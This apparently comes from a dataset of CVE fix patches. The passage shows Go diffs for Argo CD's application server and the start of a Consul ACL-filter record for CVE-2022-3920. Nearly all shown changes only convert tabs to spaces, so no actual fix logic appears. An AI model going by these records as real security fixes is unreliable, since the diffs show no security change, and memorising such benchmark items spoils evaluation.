&availableActions[i])\n+        }\n+\n+        return &application.ResourceActionsListResponse{Actions: actionsPtr}, nil\n }\n \n func (s *Server) getUnstructuredLiveResourceOrApp(ctx context.Context, rbacRequest string, q *application.ApplicationResourceRequest) (obj *unstructured.Unstructured, res *appv1.ResourceNode, app *appv1.Application, config *rest.Config, err error) {\n-\tif q.GetKind() == applicationType.ApplicationKind && q.GetGroup() == applicationType.Group && q.GetName() == q.GetResourceName() {\n-\t\tapp, err = s.getApplicationEnforceRBACInformer(ctx, rbacRequest, q.GetProject(), q.GetAppNamespace(), q.GetName())\n-\t\tif err != nil {\n-\t\t\treturn nil, nil, nil, nil, err\n-\t\t}\n-\t\tif err = s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacRequest, app.RBACName(s.ns)); err != nil {\n-\t\t\treturn nil, nil, nil, nil, err\n-\t\t}\n-\t\tconfig, err = s.getApplicationClusterConfig(ctx, app)\n-\t\tif err != nil {\n-\t\t\treturn nil, nil, nil, nil, fmt.Errorf(\"error getting application cluster config: %w\", err)\n-\t\t}\n-\t\tobj, err = kube.ToUnstructured(app)\n-\t} else {\n-\t\tres, config, app, err = s.getAppLiveResource(ctx, rbacRequest, q)\n-\t\tif err != nil {\n-\t\t\treturn nil, nil, nil, nil, err\n-\t\t}\n-\t\tobj, err = s.kubectl.GetResource(ctx, config, res.GroupKindVersion(), res.Name, res.Namespace)\n-\n-\t}\n-\tif err != nil {\n-\t\treturn nil, nil, nil, nil, fmt.Errorf(\"error getting resource: %w\", err)\n-\t}\n-\treturn\n+        if q.GetKind() == applicationType.ApplicationKind && q.GetGroup() == applicationType.Group && q.GetName() == q.GetResourceName() {\n+                app, err = s.getApplicationEnforceRBACInformer(ctx, rbacRequest, q.GetProject(), q.GetAppNamespace(), q.GetName())\n+                if err != nil {\n+                        return nil, nil, nil, nil, err\n+                }\n+                if err = s.enf.EnforceErr(ctx.Value(\"claims\"), rbacpolicy.ResourceApplications, rbacRequest, app.RBACName(s.ns)); err != nil {\n+                        return nil, nil, nil, nil, err\n+                }\n+                config, err = s.getApplicationClusterConfig(ctx, app)\n+                if err != nil {\n+                        return nil, nil, nil, nil, fmt.Errorf(\"error getting application cluster config: %w\", err)\n+                }\n+                obj, err = kube.ToUnstructured(app)\n+        } else {\n+                res, config, app, err = s.getAppLiveResource(ctx, rbacRequest, q)\n+                if err != nil {\n+                        return nil, nil, nil, nil, err\n+                }\n+                obj, err = s.kubectl.GetResource(ctx, config, res.GroupKindVersion(), res.Name, res.Namespace)\n+\n+        }\n+        if err != nil {\n+                return nil, nil, nil, nil, fmt.Errorf(\"error getting resource: %w\", err)\n+        }\n+        return\n }\n \n func (s *Server) getAvailableActions(resourceOverrides map[string]appv1.ResourceOverride, obj *unstructured.Unstructured) ([]appv1.ResourceAction, error) {\n-\tluaVM := lua.VM{\n-\t\tResourceOverrides: resourceOverrides,\n-\t}\n-\n-\tdiscoveryScript, err := luaVM.GetResourceActionDiscovery(obj)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting Lua discovery script: %w\", err)\n-\t}\n-\tif discoveryScript == \"\" {\n-\t\treturn []appv1.ResourceAction{}, nil\n-\t}\n-\tavailableActions, err := luaVM.ExecuteResourceActionDiscovery(obj, discoveryScript)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error executing Lua discovery script: %w\", err)\n-\t}\n-\treturn availableActions, nil\n+        luaVM := lua.VM{\n+                ResourceOverrides: resourceOverrides,\n+        }\n+\n+        discoveryScript, err := luaVM.GetResourceActionDiscovery(obj)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting Lua discovery script: %w\", err)\n+        }\n+        if discoveryScript == \"\" {\n+                return []appv1.ResourceAction{}, nil\n+        }\n+        availableActions, err := luaVM.ExecuteResourceActionDiscovery(obj, discoveryScript)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error executing Lua discovery script: %w\", err)\n+        }\n+        return availableActions, nil\n \n }\n \n func (s *Server) RunResourceAction(ctx context.Context, q *application.ResourceActionRunRequest) (*application.ApplicationResponse, error) {\n-\tresourceRequest := &application.ApplicationResourceRequest{\n-\t\tName:         q.Name,\n-\t\tAppNamespace: q.AppNamespace,\n-\t\tNamespace:    q.Namespace,\n-\t\tResourceName: q.ResourceName,\n-\t\tKind:         q.Kind,\n-\t\tVersion:      q.Version,\n-\t\tGroup:        q.Group,\n-\t\tProject:      q.Project,\n-\t}\n-\tactionRequest := fmt.Sprintf(\"%s/%s/%s/%s\", rbacpolicy.ActionAction, q.GetGroup(), q.GetKind(), q.GetAction())\n-\tliveObj, res, a, config, err := s.getUnstructuredLiveResourceOrApp(ctx, actionRequest, resourceRequest)\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tliveObjBytes, err := json.Marshal(liveObj)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error marshaling live object: %w\", err)\n-\t}\n-\n-\tresourceOverrides, err := s.settingsMgr.GetResourceOverrides()\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting resource overrides: %w\", err)\n-\t}\n-\n-\tluaVM := lua.VM{\n-\t\tResourceOverrides: resourceOverrides,\n-\t}\n-\taction, err := luaVM.GetResourceAction(liveObj, q.GetAction())\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting Lua resource action: %w\", err)\n-\t}\n-\n-\tnewObjects, err := luaVM.ExecuteResourceAction(liveObj, action.ActionLua)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error executing Lua resource action: %w\", err)\n-\t}\n-\n-\tvar app *appv1.Application\n-\t// Only bother getting the app if we know we're going to need it for a resource permission check.\n-\tif len(newObjects) > 0 {\n-\t\t// No need for an RBAC check, we checked above that the user is allowed to run this action.\n-\t\tapp, err = s.appLister.Applications(s.appNamespaceOrDefault(q.GetAppNamespace())).Get(q.GetName())\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t}\n-\n-\t// First, make sure all the returned resources are permitted, for each operation.\n-\t// Also perform create with dry-runs for all create-operation resources.\n-\t// This is performed separately to reduce the risk of only some of the resources being successfully created later.\n-\t// TODO: when apply/delete operations would be supported for custom actions,\n-\t// the dry-run for relevant apply/delete operation would have to be invoked as well.\n-\tfor _, impactedResource := range newObjects {\n-\t\tnewObj := impactedResource.UnstructuredObj\n-\t\terr := s.verifyResourcePermitted(ctx, app, newObj)\n-\t\tif err != nil {\n-\t\t\treturn nil, err\n-\t\t}\n-\t\tswitch impactedResource.K8SOperation {\n-\t\tcase lua.CreateOperation:\n-\t\t\tcreateOptions := metav1.CreateOptions{DryRun: []string{\"All\"}}\n-\t\t\t_, err := s.kubectl.CreateResource(ctx, config, newObj.GroupVersionKind(), newObj.GetName(), newObj.GetNamespace(), newObj, createOptions)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, err\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\t// Now, perform the actual operations.\n-\t// The creation itself is not transactional.\n-\t// TODO: maybe create a k8s list representation of the resources,\n-\t// and invoke create on this list resource to make it semi-transactional (there is still patch operation that is separate,\n-\t// thus can fail separately from create).\n-\tfor _, impactedResource := range newObjects {\n-\t\tnewObj := impactedResource.UnstructuredObj\n-\t\tnewObjBytes, err := json.Marshal(newObj)\n-\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error marshaling new object: %w\", err)\n-\t\t}\n-\n-\t\tswitch impactedResource.K8SOperation {\n-\t\t// No default case since a not supported operation would have failed upon unmarshaling earlier\n-\t\tcase lua.PatchOperation:\n-\t\t\t_, err := s.patchResource(ctx, config, liveObjBytes, newObjBytes, newObj)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, err\n-\t\t\t}\n-\t\tcase lua.CreateOperation:\n-\t\t\t_, err := s.createResource(ctx, config, newObj)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, err\n-\t\t\t}\n-\t\t}\n-\t}\n-\n-\tif res == nil {\n-\t\ts.logAppEvent(a, ctx, argo.EventReasonResourceActionRan, fmt.Sprintf(\"ran action %s\", q.GetAction()))\n-\t} else {\n-\t\ts.logAppEvent(a, ctx, argo.EventReasonResourceActionRan, fmt.Sprintf(\"ran action %s on resource %s/%s/%s\", q.GetAction(), res.Group, res.Kind, res.Name))\n-\t\ts.logResourceEvent(res, ctx, argo.EventReasonResourceActionRan, fmt.Sprintf(\"ran action %s\", q.GetAction()))\n-\t}\n-\treturn &application.ApplicationResponse{}, nil\n+        resourceRequest := &application.ApplicationResourceRequest{\n+                Name:         q.Name,\n+                AppNamespace: q.AppNamespace,\n+                Namespace:    q.Namespace,\n+                ResourceName: q.ResourceName,\n+                Kind:         q.Kind,\n+                Version:      q.Version,\n+                Group:        q.Group,\n+                Project:      q.Project,\n+        }\n+        actionRequest := fmt.Sprintf(\"%s/%s/%s/%s\", rbacpolicy.ActionAction, q.GetGroup(), q.GetKind(), q.GetAction())\n+        liveObj, res, a, config, err := s.getUnstructuredLiveResourceOrApp(ctx, actionRequest, resourceRequest)\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        liveObjBytes, err := json.Marshal(liveObj)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error marshaling live object: %w\", err)\n+        }\n+\n+        resourceOverrides, err := s.settingsMgr.GetResourceOverrides()\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting resource overrides: %w\", err)\n+        }\n+\n+        luaVM := lua.VM{\n+                ResourceOverrides: resourceOverrides,\n+        }\n+        action, err := luaVM.GetResourceAction(liveObj, q.GetAction())\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting Lua resource action: %w\", err)\n+        }\n+\n+        newObjects, err := luaVM.ExecuteResourceAction(liveObj, action.ActionLua)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error executing Lua resource action: %w\", err)\n+        }\n+\n+        var app *appv1.Application\n+        // Only bother getting the app if we know we're going to need it for a resource permission check.\n+        if len(newObjects) > 0 {\n+                // No need for an RBAC check, we checked above that the user is allowed to run this action.\n+                app, err = s.appLister.Applications(s.appNamespaceOrDefault(q.GetAppNamespace())).Get(q.GetName())\n+                if err != nil {\n+                        return nil, err\n+                }\n+        }\n+\n+        // First, make sure all the returned resources are permitted, for each operation.\n+        // Also perform create with dry-runs for all create-operation resources.\n+        // This is performed separately to reduce the risk of only some of the resources being successfully created later.\n+        // TODO: when apply/delete operations would be supported for custom actions,\n+        // the dry-run for relevant apply/delete operation would have to be invoked as well.\n+        for _, impactedResource := range newObjects {\n+                newObj := impactedResource.UnstructuredObj\n+                err := s.verifyResourcePermitted(ctx, app, newObj)\n+                if err != nil {\n+                        return nil, err\n+                }\n+                switch impactedResource.K8SOperation {\n+                case lua.CreateOperation:\n+                        createOptions := metav1.CreateOptions{DryRun: []string{\"All\"}}\n+                        _, err := s.kubectl.CreateResource(ctx, config, newObj.GroupVersionKind(), newObj.GetName(), newObj.GetNamespace(), newObj, createOptions)\n+                        if err != nil {\n+                                return nil, err\n+                        }\n+                }\n+        }\n+\n+        // Now, perform the actual operations.\n+        // The creation itself is not transactional.\n+        // TODO: maybe create a k8s list representation of the resources,\n+        // and invoke create on this list resource to make it semi-transactional (there is still patch operation that is separate,\n+        // thus can fail separately from create).\n+        for _, impactedResource := range newObjects {\n+                newObj := impactedResource.UnstructuredObj\n+                newObjBytes, err := json.Marshal(newObj)\n+\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error marshaling new object: %w\", err)\n+                }\n+\n+                switch impactedResource.K8SOperation {\n+                // No default case since a not supported operation would have failed upon unmarshaling earlier\n+                case lua.PatchOperation:\n+                        _, err := s.patchResource(ctx, config, liveObjBytes, newObjBytes, newObj)\n+                        if err != nil {\n+                                return nil, err\n+                        }\n+                case lua.CreateOperation:\n+                        _, err := s.createResource(ctx, config, newObj)\n+                        if err != nil {\n+                                return nil, err\n+                        }\n+                }\n+        }\n+\n+        if res == nil {\n+                s.logAppEvent(a, ctx, argo.EventReasonResourceActionRan, fmt.Sprintf(\"ran action %s\", q.GetAction()))\n+        } else {\n+                s.logAppEvent(a, ctx, argo.EventReasonResourceActionRan, fmt.Sprintf(\"ran action %s on resource %s/%s/%s\", q.GetAction(), res.Group, res.Kind, res.Name))\n+                s.logResourceEvent(res, ctx, argo.EventReasonResourceActionRan, fmt.Sprintf(\"ran action %s\", q.GetAction()))\n+        }\n+        return &application.ApplicationResponse{}, nil\n }\n \n func (s *Server) patchResource(ctx context.Context, config *rest.Config, liveObjBytes, newObjBytes []byte, newObj *unstructured.Unstructured) (*application.ApplicationResponse, error) {\n-\tdiffBytes, err := jsonpatch.CreateMergePatch(liveObjBytes, newObjBytes)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error calculating merge patch: %w\", err)\n-\t}\n-\tif string(diffBytes) == \"{}\" {\n-\t\treturn &application.ApplicationResponse{}, nil\n-\t}\n-\n-\t// The following logic detects if the resource action makes a modification to status and/or spec.\n-\t// If status was modified, we attempt to patch the status using status subresource, in case the\n-\t// CRD is configured using the status subresource feature. See:\n-\t// https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#status-subresource\n-\t// If status subresource is in use, the patch has to be split into two:\n-\t// * one to update spec (and other non-status fields)\n-\t// * the other to update only status.\n-\tnonStatusPatch, statusPatch, err := splitStatusPatch(diffBytes)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error splitting status patch: %w\", err)\n-\t}\n-\tif statusPatch != nil {\n-\t\t_, err = s.kubectl.PatchResource(ctx, config, newObj.GroupVersionKind(), newObj.GetName(), newObj.GetNamespace(), types.MergePatchType, diffBytes, \"status\")\n-\t\tif err != nil {\n-\t\t\tif !apierr.IsNotFound(err) {\n-\t\t\t\treturn nil, fmt.Errorf(\"error patching resource: %w\", err)\n-\t\t\t}\n-\t\t\t// K8s API server returns 404 NotFound when the CRD does not support the status subresource\n-\t\t\t// if we get here, the CRD does not use the status subresource. We will fall back to a normal patch\n-\t\t} else {\n-\t\t\t// If we get here, the CRD does use the status subresource, so we must patch status and\n-\t\t\t// spec separately. update the diffBytes to the spec-only patch and fall through.\n-\t\t\tdiffBytes = nonStatusPatch\n-\t\t}\n-\t}\n-\tif diffBytes != nil {\n-\t\t_, err = s.kubectl.PatchResource(ctx, config, newObj.GroupVersionKind(), newObj.GetName(), newObj.GetNamespace(), types.MergePatchType, diffBytes)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"error patching resource: %w\", err)\n-\t\t}\n-\t}\n-\treturn &application.ApplicationResponse{}, nil\n+        diffBytes, err := jsonpatch.CreateMergePatch(liveObjBytes, newObjBytes)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error calculating merge patch: %w\", err)\n+        }\n+        if string(diffBytes) == \"{}\" {\n+                return &application.ApplicationResponse{}, nil\n+        }\n+\n+        // The following logic detects if the resource action makes a modification to status and/or spec.\n+        // If status was modified, we attempt to patch the status using status subresource, in case the\n+        // CRD is configured using the status subresource feature. See:\n+        // https://kubernetes.io/docs/tasks/extend-kubernetes/custom-resources/custom-resource-definitions/#status-subresource\n+        // If status subresource is in use, the patch has to be split into two:\n+        // * one to update spec (and other non-status fields)\n+        // * the other to update only status.\n+        nonStatusPatch, statusPatch, err := splitStatusPatch(diffBytes)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error splitting status patch: %w\", err)\n+        }\n+        if statusPatch != nil {\n+                _, err = s.kubectl.PatchResource(ctx, config, newObj.GroupVersionKind(), newObj.GetName(), newObj.GetNamespace(), types.MergePatchType, diffBytes, \"status\")\n+                if err != nil {\n+                        if !apierr.IsNotFound(err) {\n+                                return nil, fmt.Errorf(\"error patching resource: %w\", err)\n+                        }\n+                        // K8s API server returns 404 NotFound when the CRD does not support the status subresource\n+                        // if we get here, the CRD does not use the status subresource. We will fall back to a normal patch\n+                } else {\n+                        // If we get here, the CRD does use the status subresource, so we must patch status and\n+                        // spec separately. update the diffBytes to the spec-only patch and fall through.\n+                        diffBytes = nonStatusPatch\n+                }\n+        }\n+        if diffBytes != nil {\n+                _, err = s.kubectl.PatchResource(ctx, config, newObj.GroupVersionKind(), newObj.GetName(), newObj.GetNamespace(), types.MergePatchType, diffBytes)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"error patching resource: %w\", err)\n+                }\n+        }\n+        return &application.ApplicationResponse{}, nil\n }\n \n func (s *Server) verifyResourcePermitted(ctx context.Context, app *appv1.Application, obj *unstructured.Unstructured) error {\n-\tproj, err := argo.GetAppProject(app, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n-\tif err != nil {\n-\t\tif apierr.IsNotFound(err) {\n-\t\t\treturn fmt.Errorf(\"application references project %s which does not exist\", app.Spec.Project)\n-\t\t}\n-\t\treturn fmt.Errorf(\"failed to get project %s: %w\", app.Spec.Project, err)\n-\t}\n-\tpermitted, err := proj.IsResourcePermitted(schema.GroupKind{Group: obj.GroupVersionKind().Group, Kind: obj.GroupVersionKind().Kind}, obj.GetNamespace(), app.Spec.Destination, func(project string) ([]*appv1.Cluster, error) {\n-\t\tclusters, err := s.db.GetProjectClusters(context.TODO(), project)\n-\t\tif err != nil {\n-\t\t\treturn nil, fmt.Errorf(\"failed to get project clusters: %w\", err)\n-\t\t}\n-\t\treturn clusters, nil\n-\t})\n-\tif err != nil {\n-\t\treturn fmt.Errorf(\"error checking resource permissions: %w\", err)\n-\t}\n-\tif !permitted {\n-\t\treturn fmt.Errorf(\"application %s is not permitted to manage %s/%s/%s in %s\", app.RBACName(s.ns), obj.GroupVersionKind().Group, obj.GroupVersionKind().Kind, obj.GetName(), obj.GetNamespace())\n-\t}\n-\n-\treturn nil\n+        proj, err := argo.GetAppProject(app, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n+        if err != nil {\n+                if apierr.IsNotFound(err) {\n+                        return fmt.Errorf(\"application references project %s which does not exist\", app.Spec.Project)\n+                }\n+                return fmt.Errorf(\"failed to get project %s: %w\", app.Spec.Project, err)\n+        }\n+        permitted, err := proj.IsResourcePermitted(schema.GroupKind{Group: obj.GroupVersionKind().Group, Kind: obj.GroupVersionKind().Kind}, obj.GetNamespace(), app.Spec.Destination, func(project string) ([]*appv1.Cluster, error) {\n+                clusters, err := s.db.GetProjectClusters(context.TODO(), project)\n+                if err != nil {\n+                        return nil, fmt.Errorf(\"failed to get project clusters: %w\", err)\n+                }\n+                return clusters, nil\n+        })\n+        if err != nil {\n+                return fmt.Errorf(\"error checking resource permissions: %w\", err)\n+        }\n+        if !permitted {\n+                return fmt.Errorf(\"application %s is not permitted to manage %s/%s/%s in %s\", app.RBACName(s.ns), obj.GroupVersionKind().Group, obj.GroupVersionKind().Kind, obj.GetName(), obj.GetNamespace())\n+        }\n+\n+        return nil\n }\n \n func (s *Server) createResource(ctx context.Context, config *rest.Config, newObj *unstructured.Unstructured) (*application.ApplicationResponse, error) {\n-\t_, err := s.kubectl.CreateResource(ctx, config, newObj.GroupVersionKind(), newObj.GetName(), newObj.GetNamespace(), newObj, metav1.CreateOptions{})\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error creating resource: %w\", err)\n-\t}\n-\treturn &application.ApplicationResponse{}, nil\n+        _, err := s.kubectl.CreateResource(ctx, config, newObj.GroupVersionKind(), newObj.GetName(), newObj.GetNamespace(), newObj, metav1.CreateOptions{})\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error creating resource: %w\", err)\n+        }\n+        return &application.ApplicationResponse{}, nil\n }\n \n // splitStatusPatch splits a patch into two: one for a non-status patch, and the status-only patch.\n // Returns nil for either if the patch doesn't have modifications to non-status, or status, respectively.\n func splitStatusPatch(patch []byte) ([]byte, []byte, error) {\n-\tvar obj map[string]interface{}\n-\terr := json.Unmarshal(patch, &obj)\n-\tif err != nil {\n-\t\treturn nil, nil, err\n-\t}\n-\tvar nonStatusPatch, statusPatch []byte\n-\tif statusVal, ok := obj[\"status\"]; ok {\n-\t\t// calculate the status-only patch\n-\t\tstatusObj := map[string]interface{}{\n-\t\t\t\"status\": statusVal,\n-\t\t}\n-\t\tstatusPatch, err = json.Marshal(statusObj)\n-\t\tif err != nil {\n-\t\t\treturn nil, nil, err\n-\t\t}\n-\t\t// remove status, and calculate the non-status patch\n-\t\tdelete(obj, \"status\")\n-\t\tif len(obj) > 0 {\n-\t\t\tnonStatusPatch, err = json.Marshal(obj)\n-\t\t\tif err != nil {\n-\t\t\t\treturn nil, nil, err\n-\t\t\t}\n-\t\t}\n-\t} else {\n-\t\t// status was not modified in patch\n-\t\tnonStatusPatch = patch\n-\t}\n-\treturn nonStatusPatch, statusPatch, nil\n+        var obj map[string]interface{}\n+        err := json.Unmarshal(patch, &obj)\n+        if err != nil {\n+                return nil, nil, err\n+        }\n+        var nonStatusPatch, statusPatch []byte\n+        if statusVal, ok := obj[\"status\"]; ok {\n+                // calculate the status-only patch\n+                statusObj := map[string]interface{}{\n+                        \"status\": statusVal,\n+                }\n+                statusPatch, err = json.Marshal(statusObj)\n+                if err != nil {\n+                        return nil, nil, err\n+                }\n+                // remove status, and calculate the non-status patch\n+                delete(obj, \"status\")\n+                if len(obj) > 0 {\n+                        nonStatusPatch, err = json.Marshal(obj)\n+                        if err != nil {\n+                                return nil, nil, err\n+                        }\n+                }\n+        } else {\n+                // status was not modified in patch\n+                nonStatusPatch = patch\n+        }\n+        return nonStatusPatch, statusPatch, nil\n }\n \n func (s *Server) GetApplicationSyncWindows(ctx context.Context, q *application.ApplicationSyncWindowsQuery) (*application.ApplicationSyncWindowsResponse, error) {\n-\ta, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName(), \"\")\n-\tif err != nil {\n-\t\treturn nil, err\n-\t}\n-\n-\tproj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n-\tif err != nil {\n-\t\treturn nil, fmt.Errorf(\"error getting app project: %w\", err)\n-\t}\n-\n-\twindows := proj.Spec.SyncWindows.Matches(a)\n-\tsync := windows.CanSync(true)\n-\n-\tres := &application.ApplicationSyncWindowsResponse{\n-\t\tActiveWindows:   convertSyncWindows(windows.Active()),\n-\t\tAssignedWindows: convertSyncWindows(windows),\n-\t\tCanSync:         &sync,\n-\t}\n-\n-\treturn res, nil\n+        a, err := s.getApplicationEnforceRBACClient(ctx, rbacpolicy.ActionGet, q.GetProject(), q.GetAppNamespace(), q.GetName(), \"\")\n+        if err != nil {\n+                return nil, err\n+        }\n+\n+        proj, err := argo.GetAppProject(a, applisters.NewAppProjectLister(s.projInformer.GetIndexer()), s.ns, s.settingsMgr, s.db, ctx)\n+        if err != nil {\n+                return nil, fmt.Errorf(\"error getting app project: %w\", err)\n+        }\n+\n+        windows := proj.Spec.SyncWindows.Matches(a)\n+        sync := windows.CanSync(true)\n+\n+        res := &application.ApplicationSyncWindowsResponse{\n+                ActiveWindows:   convertSyncWindows(windows.Active()),\n+                AssignedWindows: convertSyncWindows(windows),\n+                CanSync:         &sync,\n+        }\n+\n+        return res, nil\n }\n \n func (s *Server) inferResourcesStatusHealth(app *appv1.Application) {\n-\tif app.Status.ResourceHealthSource == appv1.ResourceHealthLocationAppTree {\n-\t\ttree := &appv1.ApplicationTree{}\n-\t\tif err := s.cache.GetAppResourcesTree(app.Name, tree); err == nil {\n-\t\t\thealthByKey := map[kube.ResourceKey]*appv1.HealthStatus{}\n-\t\t\tfor _, node := range tree.Nodes {\n-\t\t\t\thealthByKey[kube.NewResourceKey(node.Group, node.Kind, node.Namespace, node.Name)] = node.Health\n-\t\t\t}\n-\t\t\tfor i, res := range app.Status.Resources {\n-\t\t\t\tres.Health = healthByKey[kube.NewResourceKey(res.Group, res.Kind, res.Namespace, res.Name)]\n-\t\t\t\tapp.Status.Resources[i] = res\n-\t\t\t}\n-\t\t}\n-\t}\n+        if app.Status.ResourceHealthSource == appv1.ResourceHealthLocationAppTree {\n+                tree := &appv1.ApplicationTree{}\n+                if err := s.cache.GetAppResourcesTree(app.Name, tree); err == nil {\n+                        healthByKey := map[kube.ResourceKey]*appv1.HealthStatus{}\n+                        for _, node := range tree.Nodes {\n+                                healthByKey[kube.NewResourceKey(node.Group, node.Kind, node.Namespace, node.Name)] = node.Health\n+                        }\n+                        for i, res := range app.Status.Resources {\n+                                res.Health = healthByKey[kube.NewResourceKey(res.Group, res.Kind, res.Namespace, res.Name)]\n+                                app.Status.Resources[i] = res\n+                        }\n+                }\n+        }\n }\n \n func convertSyncWindows(w *appv1.SyncWindows) []*application.ApplicationSyncWindow {\n-\tif w != nil {\n-\t\tvar windows []*application.ApplicationSyncWindow\n-\t\tfor _, w := range *w {\n-\t\t\tnw := &application.ApplicationSyncWindow{\n-\t\t\t\tKind:       &w.Kind,\n-\t\t\t\tSchedule:   &w.Schedule,\n-\t\t\t\tDuration:   &w.Duration,\n-\t\t\t\tManualSync: &w.ManualSync,\n-\t\t\t}\n-\t\t\twindows = append(windows, nw)\n-\t\t}\n-\t\tif len(windows) > 0 {\n-\t\t\treturn windows\n-\t\t}\n-\t}\n-\treturn nil\n+        if w != nil {\n+                var windows []*application.ApplicationSyncWindow\n+                for _, w := range *w {\n+                        nw := &application.ApplicationSyncWindow{\n+                                Kind:       &w.Kind,\n+                                Schedule:   &w.Schedule,\n+                                Duration:   &w.Duration,\n+                                ManualSync: &w.ManualSync,\n+                        }\n+                        windows = append(windows, nw)\n+                }\n+                if len(windows) > 0 {\n+                        return windows\n+                }\n+        }\n+        return nil\n }\n \n func getPropagationPolicyFinalizer(policy string) string {\n-\tswitch strings.ToLower(policy) {\n-\tcase backgroundPropagationPolicy:\n-\t\treturn appv1.BackgroundPropagationPolicyFinalizer\n-\tcase foregroundPropagationPolicy:\n-\t\treturn appv1.ForegroundPropagationPolicyFinalizer\n-\tcase \"\":\n-\t\treturn appv1.ResourcesFinalizerName\n-\tdefault:\n-\t\treturn \"\"\n-\t}\n+        switch strings.ToLower(policy) {\n+        case backgroundPropagationPolicy:\n+                return appv1.BackgroundPropagationPolicyFinalizer\n+        case foregroundPropagationPolicy:\n+                return appv1.ForegroundPropagationPolicyFinalizer\n+        case \"\":\n+                return appv1.ResourcesFinalizerName\n+        default:\n+                return \"\"\n+        }\n }\n \n func (s *Server) appNamespaceOrDefault(appNs string) string {\n-\tif appNs == \"\" {\n-\t\treturn s.ns\n-\t} else {\n-\t\treturn appNs\n-\t}\n+        if appNs == \"\" {\n+                return s.ns\n+        } else {\n+                return appNs\n+        }\n }\n \n func (s *Server) isNamespaceEnabled(namespace string) bool {\n-\treturn security.IsNamespaceEnabled(namespace, s.ns, s.enabledNamespaces)\n+        return security.IsNamespaceEnabled(namespace, s.ns, s.enabledNamespaces)\n }\n \n // getProjectFromApplicationQuery gets the project names from a query. If the legacy \"project\" field was specified, use\n // that. Otherwise, use the newer \"projects\" field.\n func getProjectsFromApplicationQuery(q application.ApplicationQuery) []string {\n-\tif q.Project != nil {\n-\t\treturn q.Project\n-\t}\n-\treturn q.Projects\n+        if q.Project != nil {\n+                return q.Project\n+        }\n+        return q.Projects\n }\n"}
{"cve":"CVE-2022-3920:0708", "fix_patch": "diff --git a/agent/structs/aclfilter/filter.go b/agent/structs/aclfilter/filter.go\nindex b976627dc7..565d52804a 100644\n--- a/agent/structs/aclfilter/filter.go\n+++ b/agent/structs/aclfilter/filter.go\n@@ -1,414 +1,436 @@\n package aclfilter\n \n import (\n-\t\"fmt\"\n+        \"fmt\"\n \n-\t\"github.com/hashicorp/go-hclog\"\n+        \"github.com/hashicorp/go-hclog\"\n \n-\t\"github.com/hashicorp/consul/acl\"\n-\t\"github.com/hashicorp/consul/agent/structs\"\n+        \"github.com/hashicorp/consul/acl\"\n+        \"github.com/hashicorp/consul/agent/structs\"\n )\n \n const (\n-\t// RedactedToken is shown in structures with embedded tokens when they\n-\t// are not allowed to be displayed.\n-\tRedactedToken = \"<hidden>\"\n+        // RedactedToken is shown in structures with embedded tokens when they\n+        // are not allowed to be displayed.\n+        RedactedToken = \"<hidden>\"\n )\n \n // Filter is used to filter results based on ACL rules.\n type Filter struct {\n-\tauthorizer acl.Authorizer\n-\tlogger     hclog.Logger\n+        authorizer acl.Authorizer\n+        logger     hclog.Logger\n }\n \n // New constructs a Filter with the given authorizer.\n func New(authorizer acl.Authorizer, logger hclog.Logger) *Filter {\n-\tif logger == nil {\n-\t\tlogger = hclog.NewNullLogger()\n-\t}\n-\treturn &Filter{authorizer, logger}\n+        if logger == nil {\n+                logger = hclog.NewNullLogger()\n+        }\n+        return &Filter{authorizer, logger}\n }\n \n // Filter the given subject in-place.\n func (f *Filter) Filter(subject any) {\n-\tswitch v := subject.(type) {\n-\tcase *structs.CheckServiceNodes:\n-\t\tf.filterCheckServiceNodes(v)\n+        switch v := subject.(type) {\n+        case *structs.CheckServiceNodes:\n+                f.filterCheckServiceNodes(v)\n \n-\tcase *structs.IndexedCheckServiceNodes:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterCheckServiceNodes(&v.Nodes)\n+        case *structs.IndexedCheckServiceNodes:\n+                v.QueryMeta.ResultsFilteredByACLs = f.filterCheckServiceNodes(&v.Nodes)\n \n-\tcase *structs.PreparedQueryExecuteResponse:\n-\t\tv.QueryMeta.ResultsFilteredByACLs = f.filterCheckServiceNodes(&v.Nodes)\n-\n-\tcase *structs.IndexedServiceTopology:\n-\t\tfiltered := f.filterServiceTopology(v.ServiceTopology)\n-\t\tif filtered {\n-\t\t\tv.FilteredByACLs = 